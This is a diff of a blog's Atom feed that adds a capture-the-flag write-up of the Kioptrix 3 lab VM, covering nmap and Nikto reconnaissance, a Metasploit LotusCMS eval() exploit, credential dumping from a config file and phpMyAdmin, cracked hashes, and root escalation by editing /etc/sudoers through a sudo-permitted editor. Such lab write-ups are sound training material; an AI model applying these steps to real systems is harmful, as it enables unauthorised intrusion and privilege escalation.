@@ -4,7 +4,7 @@
   <title><![CDATA[My portfolio]]></title>
   <link href="http://paulsec.github.io/atom.xml" rel="self"/>
   <link href="http://paulsec.github.io/"/>
-  <updated>2014-06-03T17:55:13+02:00</updated>
+  <updated>2014-06-12T22:04:28+02:00</updated>
   <id>http://paulsec.github.io/</id>
   <author>
     <name><![CDATA[Paul A. (PaulSec)]]></name>
@@ -12,6 +12,280 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Kioptrix 3: Write-up]]></title>
+    <link href="http://paulsec.github.io/blog/2014/06/12/kioptrix-3-write-up/"/>
+    <updated>2014-06-12T21:44:04+02:00</updated>
+    <id>http://paulsec.github.io/blog/2014/06/12/kioptrix-3-write-up</id>
+    <content type="html"><![CDATA[<p>This has been some long time I haven&rsquo;t written another write-up.
+This one&rsquo;s for Kioptrix 3 that you can find <a href="">here</a>.</p>
+
+<h3><strong>Host Discovery</strong></h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap -sP 192.168.56.1/24</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and we got the IP address : <code>192.168.56.101</code>.</p>
+
+<p>As it was explained, you need to add <code>192.168.56.101 kioptrix3.com</code> in your <strong>/etc/hosts</strong>.</p>
+
+<h3><strong>Fingerprinting</strong></h3>
+
+<p>Then, let&rsquo;s find what kind of services are running on the host machine.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nmap 192.168.56.101 -sV -A 
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-12 20:15 CEST
+</span><span class='line'>Nmap scan report for malicious (192.168.56.101)
+</span><span class='line'>Host is up (0.00034s latency).
+</span><span class='line'>Not shown: 998 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+</span><span class='line'>|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+</span><span class='line'>|_http-title: Ligoat Security - Got Goat? Security ...
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Quite obvious, let&rsquo;s check this Web server !</p>
+
+<h3><strong>Reconnaissance</strong></h3>
+
+<p>Thanks to Nikto, we managed to find useful informations:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(...)
+</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ Cookie phpMyAdmin created without the httponly flag
+</span><span class='line'>(...)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And with DirBuster:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(...)
+</span><span class='line'>Dir found: /gallery/ - 500
+</span><span class='line'>File found: /gallery/index.php - 500
+</span><span class='line'>File found: /gallery/recent.php - 500
+</span><span class='line'>Dir found: /gallery/p.php/ - 500
+</span><span class='line'>Dir found: /gallery/g.php/ - 500
+</span><span class='line'>Dir found: /gallery/themes/ - 200
+</span><span class='line'>(...)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Moreover, by navigating on the website, I managed to get the CMS behind:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;keywords&quot;</span> <span class="na">content=</span><span class="s">&quot;LotusCMS&quot;</span> <span class="nt">/&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3><strong>Exploitation</strong></h3>
+
+<p>Thanks to this information, I looked on Exploit-db for <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=&amp;filter_exploit_text=LotusCMS&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">some known vulnerabilities</a>.</p>
+
+<p><strong>Bingo</strong>, there was. :&ndash;)</p>
+
+<p>I ran metasploit and exploited this <a href="http://www.exploit-db.com/exploits/18565/"><em>eval() Remote Command Execution</em></a>.
+I managed to get a (limited) meterpreter session on the machine, and retrieved different files on the filesystem such as configuration file <code>gconfig.php</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="cm">/*</span>
+</span><span class='line'><span class="cm">        A sample Gallarific configuration file. You should edit</span>
+</span><span class='line'><span class="cm">        the installer details below and save this file as gconfig.php</span>
+</span><span class='line'><span class="cm">        Do not modify anything else if you don&#39;t know what it is.</span>
+</span><span class='line'><span class="cm">    */</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Installer Details -----------------------------------------------</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Enter the full HTTP path to your Gallarific folder below,</span>
+</span><span class='line'>    <span class="c1">// such as http://www.yoursite.com/gallery</span>
+</span><span class='line'>    <span class="c1">// Do NOT include a trailing forward slash</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_path&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;http://kioptrix3.com/gallery&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_server&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_database&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;gallery&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_username&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;root&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_password&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;fuckeyou&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Setting Details -------------------------------------------------</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$g_mysql_c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_server&quot;</span><span class="p">],</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_username&quot;</span><span class="p">],</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_password&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;A connection to the database couldn&#39;t be established: &quot;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class='line'>        <span class="k">die</span><span class="p">();</span>
+</span><span class='line'><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$g_mysql_d</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;gallarific_mysql_database&quot;</span><span class="p">],</span> <span class="nv">$g_mysql_c</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;The Gallarific database couldn&#39;t be opened: &quot;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">());</span>
+</span><span class='line'>        <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>    <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nv">$settings</span><span class="o">=</span><span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;select * from gallarific_settings&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$settings</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span>
+</span><span class='line'>            <span class="k">while</span><span class="p">(</span><span class="nv">$data</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$settings</span><span class="p">)){</span>
+</span><span class='line'>                <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">{</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;settings_name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;settings_value&#39;</span><span class="p">];</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks to those credentials, I managed to access the phpMyAdmin and dumped all databases.</p>
+
+<p>I got different hashes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">dreg</span><span class="o">:</span><span class="mi">0</span><span class="nx">d3eccfb887aabd50f243b3f155c0f85</span> <span class="o">=&gt;</span> <span class="nx">Mast3r</span>
+</span><span class='line'><span class="nx">loneferret</span><span class="o">:</span><span class="mi">5</span><span class="nx">badcaf789d3d1d09794d8f021f40f0e</span> <span class="o">=&gt;</span> <span class="nx">starwars</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Moreover, I had the admin&rsquo;s password: <strong>n0t7t1k4</strong>.</p>
+
+<p>I managed to log in with loneferret&rsquo;s credentials on the SSH service.</p>
+
+<p>I checked the files which were in the home folder and I found <code>CompanyPolicy.README</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="err">$</span> <span class="nx">cat</span> <span class="nx">CompanyPolicy</span><span class="o">.</span><span class="nx">README</span>
+</span><span class='line'><span class="nx">Hello</span> <span class="k">new</span> <span class="nx">employee</span><span class="p">,</span>
+</span><span class='line'><span class="nx">It</span> <span class="nx">is</span> <span class="nx">company</span> <span class="nx">policy</span> <span class="nx">here</span> <span class="nx">to</span> <span class="k">use</span> <span class="nx">our</span> <span class="nx">newly</span> <span class="nx">installed</span> <span class="nx">software</span> <span class="k">for</span> <span class="nx">editing</span><span class="p">,</span> <span class="nx">creating</span> <span class="k">and</span> <span class="nx">viewing</span> <span class="nx">files</span><span class="o">.</span>
+</span><span class='line'><span class="nx">Please</span> <span class="k">use</span> <span class="nx">the</span> <span class="nx">command</span> <span class="s1">&#39;sudo ht&#39;</span><span class="o">.</span>
+</span><span class='line'><span class="nx">Failure</span> <span class="nx">to</span> <span class="k">do</span> <span class="nx">so</span> <span class="nx">will</span> <span class="nx">result</span> <span class="nx">in</span> <span class="nx">you</span> <span class="nx">immediate</span> <span class="nx">termination</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">DG</span>
+</span><span class='line'><span class="nx">CEO</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And then:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="err">$</span> <span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
+</span><span class='line'><span class="nx">User</span> <span class="nx">loneferret</span> <span class="nx">may</span> <span class="nx">run</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="nx">on</span> <span class="k">this</span> <span class="nx">host</span><span class="o">:</span>
+</span><span class='line'>    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="o">!/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">su</span>
+</span><span class='line'>    <span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">ht</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks to this, I only had to edit the <code>/etc/sudoers</code> file and update the entry:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">loneferret</span> <span class="nx">ALL</span><span class="o">=</span><span class="nx">NOPASSWD</span><span class="o">:</span> <span class="o">!/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">su</span><span class="p">,</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">ht</span><span class="p">,</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Back to the terminal:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">loneferret</span><span class="o">@</span><span class="nx">Kioptrix3</span><span class="o">:~</span><span class="err">$</span> <span class="nx">sudo</span> <span class="nx">bash</span>
+</span><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">Kioptrix3</span><span class="o">:~</span><span class="c1">#</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>and Voilà, I was able to access the file <code>/root/Congrats.txt</code>.</p>
+
+<p>Nice VM it was a fun trick with <code>ht</code> command.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Diving into XSS Google's Game]]></title>
